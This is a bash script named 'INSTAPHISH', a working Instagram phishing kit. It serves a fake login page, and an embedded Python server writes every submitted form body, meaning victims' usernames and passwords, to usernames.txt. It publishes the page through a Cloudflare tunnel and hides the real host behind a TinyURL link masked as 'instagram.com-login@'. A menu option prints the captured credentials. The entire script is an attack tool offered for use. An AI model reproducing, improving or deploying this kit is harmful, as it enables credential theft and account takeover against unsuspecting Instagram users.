#!/bin/bash

clear

install_deps() {
    if ! command -v figlet >/dev/null 2>&1; then
        echo "[+] Installing figlet..."
        sudo apt update && sudo apt install -y figlet
    fi

    if ! command -v cloudflared >/dev/null 2>&1; then
        echo "[+] Installing cloudflared..."
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x cloudflared-linux-amd64
        sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
    fi
}

install_deps

figlet "INSTAPHISH"

echo "------------------------------------------"
echo "1. Start Server & Generate Public URL"
echo "2. View Captured Data"
echo "3. Exit"
echo "------------------------------------------"
read -p "Choose an option: " choice

if [ "$choice" -eq 1 ]; then
    echo "[+] Cleaning up old processes..."
    pkill -f "http.server" > /dev/null 2>&1
    pkill -f "cloudflared" > /dev/null 2>&1
    sleep 1

    if [ ! -f "login.html" ]; then
        echo "[-] Error: login.html not found!"
        exit 1
    fi

    echo "[+] Starting Memory-Based Python Server on port 8080..."
    
    python3 -c '
import http.server, socketserver, sys

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        
        # Open with explicit encoding and use flush to ensure write
        with open("usernames.txt", "a", encoding="utf-8") as f:
            f.write(f"{post_data}\n---\n")
            f.flush()
        
        # Send response to browser so it doesnt hang/fail
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"Success. Data Logged.")

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", 8080), MyHandler) as httpd:
    print("Server active...")
    httpd.serve_forever()
' > /dev/null 2>&1 &

    echo "[+] Initializing Cloudflare Tunnel..."
    rm -f tunnel.log
    cloudflared tunnel --url http://localhost:8080 > tunnel.log 2>&1 &

    echo -n "[+] Waiting for Public URL generation"
    
    timeout=0
    PUBLIC_URL=""
    while [ $timeout -lt 20 ]; do
        PUBLIC_URL=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' tunnel.log | head -n 1)
        if [ -n "$PUBLIC_URL" ]; then break; fi
        echo -n "."
        sleep 2
        ((timeout++))
    done

    if [ -z "$PUBLIC_URL" ]; then
        echo -e "\n[-] FAILED to generate URL."
        exit 1
    fi

    echo -e "\n[+] Shortening and Masking URL with instagram.com..."
    SHORT_URL=$(curl -s "https://tinyurl.com/api-create.php?url=$PUBLIC_URL/login.html")
    
    if [ -z "$SHORT_URL" ] || [[ "$SHORT_URL" == *"Error"* ]]; then
        FINAL_MASKED="https://instagram.com-login@${PUBLIC_URL#https://}/login.html"
    else
        URL_TAIL=${SHORT_URL#https://}
        FINAL_MASKED="https://instagram.com-login@$URL_TAIL"
    fi

    echo -e "\n\n============================================"
    echo -e "  SUCCESS! YOUR PAGE IS ONLINE"
    echo -e "  URL: \033[1;32m$FINAL_MASKED\033[0m"
    echo -e "============================================"
    echo "[+] Logs will be saved to: usernames.txt"
    echo "[+] Press Ctrl+C to stop the server"

    touch usernames.txt
    tail -f usernames.txt

elif [ "$choice" -eq 2 ]; then
    if [ -f "usernames.txt" ]; then
        echo "--- START OF CAPTURED DATA ---"
        cat usernames.txt
        echo "--- END OF DATA ---"
    else
        echo "[-] No data captured yet."
    fi

elif [ "$choice" -eq 3 ]; then
    pkill -f "http.server"
    pkill -f "cloudflared"
    exit
else
    echo "Invalid option"
fi
